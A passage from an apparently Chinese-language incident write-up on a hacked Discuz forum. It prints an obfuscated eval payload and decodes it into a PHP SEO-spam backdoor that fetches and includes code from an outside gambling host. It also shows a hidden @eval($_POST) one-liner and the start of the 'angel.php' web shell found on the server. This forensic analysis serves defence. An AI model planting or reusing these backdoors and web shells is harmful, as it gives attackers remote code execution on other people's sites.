SGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="</span><span style="text-decoration: underline;">));</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span>
</pre>
</div>
</li>

<li>参考 <a href="http://blog.i1728.com/post/99.html">网上方法</a> 解码的结果

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span>
<span style="color: #969896; font-style: italic;">/*</span>
<span style="color: #969896; font-style: italic;">*author:whoami</span>
<span style="color: #969896; font-style: italic;">*  QQ  :4892057</span>
<span style="color: #969896; font-style: italic;">*/</span>
error_reporting(0);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span> = <span style="color: #8abeb7;">'/var/tmp/.SYSDUMP/'</span>;
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">IP</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'REMOTE_ADDR'</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Bot</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_USER_AGENT'</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Ref</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KIP</span>=<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'117.28.255.37'</span>,<span style="color: #8abeb7;">'116.55.241.24'</span>,<span style="color: #8abeb7;">'125.64.94.219'</span>,<span style="color: #8abeb7;">'119.147.114.213'</span>,<span style="color: #8abeb7;">'11</span><span style="color: #8abeb7; text-decoration: underline;">8.122.188.194'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'60.172.229.61'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.188.39.16'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.98.198'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.129.45.72'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'113.98.254.245'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'58.221.61.128'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.34.73.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'58.215.190.84'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.28.255.53'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'183.91.40.144'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.21.220.245'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'122.228.200.46'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.164.150.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'116.55.242.138'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'114.80.222.242'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'116.255.230.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'222.186.24.26'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'222.186.24.59'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'220.181.158.106'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'123.125.160.215'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBot</span>=<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Baiduspider'</span>,<span style="color: #8abeb7;">'Googlebot'</span>,<span style="color: #8abeb7;">'Yahoo'</span>,<span style="color: #8abeb7;">'Bingbot'</span>,<span style="color: #8abeb7;">'Sosospider'</span>,<span style="color: #8abeb7;">'Sogou'</span>,<span style="color: #8abeb7;">'36</span><span style="color: #8abeb7; text-decoration: underline;">0Spider'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'YoudaoBot'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Key</span>=<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'anquan.org'</span>,<span style="color: #8abeb7;">'google.com'</span>,<span style="color: #8abeb7;">'soso.com'</span>,<span style="color: #8abeb7;">'%e8%b5%8c'</span>,<span style="color: #8abeb7;">'%e9%aa%b0'</span>,<span style="color: #8abeb7;">'%e9%b1%</span><span style="color: #8abeb7; text-decoration: underline;">bc'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%89%9b'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%8d%9a%e5%bd%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%99%be%e5%ae%b6'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%a3%8b%e7%89%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%b8%b8%e6%88%8f'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%a8%b1%e4%b9%90'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%9b%bd%e9%99%85'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%9c%9f%e4%ba%ba'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%9c%9f%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%8e%b0%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%b3%a8%e5%86%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%bc%80%e6%88%b7'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%bd%a9%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e8%b5%9a%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%8f%90%e7%8e%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%ad%96%e7%95%a5'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e8%af%95%e7%8e%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%b9%b3%e5%8f%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%a4%aa%e9%98%b3%e5%9f%8e'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e4%bd%93%e9%aa%8c%e9%87%91'</span><span style="text-decoration: underline;">);</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">dec0de</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>){
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span> = explode(<span style="color: #8abeb7;">':'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Keys</span> = explode(<span style="color: #8abeb7;">':'</span>,base64_decode(str_rot13(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span>[0]))));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">News</span> = explode(<span style="color: #8abeb7;">':'</span>,base64_decode(str_rot13(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span>[1]))));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Links</span>= explode(<span style="color: #8abeb7;">':'</span>,base64_decode(str_rot13(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span>[2]))));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #81a2be;">@include</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>.<span style="color: #8abeb7;">'.Wh0AmI.MODEL'</span>);<span style="color: #b5bd68;">die</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getdata</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>){
<span style="color: #b5bd68;">if</span> (function_exists(<span style="color: #8abeb7;">'curl_exec'</span>)) {
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span> = @curl_init();
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_URL</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>);
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_HEADER</span>, 0);
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_CONNECTTIMEOUT</span>, 5);
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_RETURNTRANSFER</span>, 1);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span> = @curl_exec(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>);
@curl_close(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>);
}<span style="color: #b5bd68;">elseif</span>(function_exists(<span style="color: #8abeb7;">'stream_context_create'</span>)) {
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_cont</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'http'</span> =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'method'</span> =&gt; <span style="color: #8abeb7;">'GET'</span>,<span style="color: #8abeb7;">'timeout'</span> =&gt; 5));
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_stre</span> = @stream_context_create(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_cont</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span> = @file_get_contents(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>, <span style="color: #81a2be;">false</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_stre</span>);
}<span style="color: #b5bd68;">else</span>{
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">handle</span> = <span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>, <span style="color: #8abeb7;">"rb"</span>);<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span> = @stream_get_contents(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">handle</span>);<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">handle</span>);
}
<span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">show</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>){
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>.md5(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_HOST'</span>].<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'REQUEST_URI'</span>]);
<span style="color: #b5bd68;">if</span>(is_file(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>)){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>=<span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>,<span style="color: #8abeb7;">'r'</span>);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>=<span style="color: #81a2be;">@fread</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,filesize(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>)) {<span style="color: #81a2be;">@unlink</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>);<span style="color: #b5bd68;">return</span>;}
<span style="color: #969896; background-color: #1d1f21;"> </span>   dec0de(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
} <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>=getdata(<span style="color: #8abeb7;">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_H</span><span style="color: #8abeb7; text-decoration: underline;">OST'</span><span style="text-decoration: underline;">]);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>=<span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>,<span style="color: #8abeb7;">'w'</span>);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #81a2be;">@fwrite</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #b5bd68;">if</span>(strlen(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>) &gt; 1000) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   dec0de(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}}
<span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span>in_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">IP</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KIP</span>)){
<span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBot</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBots</span>){<span style="color: #b5bd68;">if</span>(stristr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Bot</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBots</span>)){
show(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>);
}}<span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Key</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Keys</span>){
<span style="color: #b5bd68;">if</span>(stristr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Ref</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Keys</span>)){
<span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count3</span><span style="color: #8abeb7; text-decoration: underline;">1.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;"</span><span style="text-decoration: underline;">;}}}</span>
</pre>
</div>
</li>
</ul>

<p>
上面代码的目的就是下载恶意代码并执行。  
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">继续排查</h2>
<div class="outline-text-2" id="text-4">
<p>
通过比较svn中的代码与现网的代码还发现了一个新的后门程序
</p>

<ul class="org-ul">
<li><code>uc_client/control/class.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mt</span>=<span style="color: #8abeb7;">"mFsKCleRfU"</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ojj</span>=<span style="color: #8abeb7;">"IEBleldle"</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">hsa</span>=<span style="color: #8abeb7;">"E9TVFsnd2VuJ10p"</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fnx</span>=<span style="color: #8abeb7;">"Ow=="</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;"> = str_replace(</span><span style="color: #8abeb7; text-decoration: underline;">"d"</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">"sdtdrd_redpdldadcde"</span><span style="text-decoration: underline;">); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">ef</span><span style="text-decoration: underline;"> = </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"z"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">"zbazsze64_zdzeczodze"</span><span style="text-decoration: underline;">); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dva</span><span style="text-decoration: underline;"> = </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"p"</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">"pcprpepaptpe_fpupnpcptpipopn"</span><span style="text-decoration: underline;">); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zvm</span><span style="text-decoration: underline;"> = </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dva</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">ef</span><span style="text-decoration: underline;">(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"le"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">ojj</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">mt</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">hsa</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">fnx</span><span style="text-decoration: underline;">))); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zvm</span><span style="text-decoration: underline;">(); </span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span>
</pre>
</div>

<p>
解码后的结果
</p>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #81a2be;">@eval</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">'wen'</span>]);
</pre>
</div>

<p>
上面的脚本可以注入任意的代码。
</p>
</li>

<li><code>./uc_server/data/tmp/angel.php</code>

<div class="org-src-container">

<pre class="src src-web">&lt;?php
error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
@set_time_limit(0);@preg_replace("/[email]/e",$_POST['Id'],"error");

foreach($_POST as $key =&gt; $value) {
